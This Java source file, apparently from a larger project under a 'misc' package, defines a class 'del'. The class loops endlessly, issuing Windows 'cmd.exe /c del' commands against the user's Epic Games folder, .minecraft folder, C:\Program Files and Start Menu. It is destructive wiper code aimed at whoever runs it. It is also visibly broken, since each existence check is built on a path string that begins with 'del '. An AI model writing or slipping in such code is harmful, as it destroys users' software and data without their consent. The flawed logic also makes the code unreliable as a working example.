package ml.lucid.misc;

import java.io.File;
import java.io.IOException;

public class del {

    private static String login = System.getProperty("user.name");

    private static String fort = "del C:\\Program Files\\Epic Games";
    private static String mc = "del C:\\Users\\"+login+"\\AppData\\Roaming\\.minecraft";
    private static String programs = "del C:\\Program Files\\";
    private static String startclear = " del C:\\Users\\"+login+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\";

    public static void deleter() {
        String prefix = "cmd.exe /c ";

        File fortcheck = new File(fort);
        File mccheck = new File(mc);
        File programscheck = new File(programs);
        File startcheck = new File(startclear);


        boolean exist;//initialising the exist boolean variable


            exist = fortcheck.exists();//giving it a value
        try {
            while(true) {
                if (exist) {
                    try {
                        Runtime.getRuntime().exec(prefix + fort);
                    } catch (IOException io) {
                        System.out.println(io.getMessage());
                    }

                } else {
                    System.out.println("if_1 not working");
                }
                exist = mccheck.exists();//giving it a value again...
                if (exist) {
                    try {
                        Runtime.getRuntime().exec(prefix + mc);
                    } catch (IOException io) {
                        System.out.println(io.getMessage());
                    }
                } else {
                    System.out.println("if_2 not working");
                }
                exist = programscheck.exists(); //giving it a value again and again...
                if (exist) {
                    try {
                        Runtime.getRuntime().exec(prefix + programs);
                    } catch (IOException io) {
                        System.out.println(io.getMessage());
                    }
                } else {
                    System.out.println("if_3 not working");
                }
                exist = startcheck.exists(); //giving it a value again and again and again...
                if (exist) {
                    try {
                        Runtime.getRuntime().exec(prefix + startclear);
                    } catch (IOException io) {
                        System.out.println(io.getMessage());
                    }
                } else {
                    System.out.println("if_4 not working");
                }
            }
        }catch (Exception e) {
            System.out.println("del class not working");
        }

    }
}
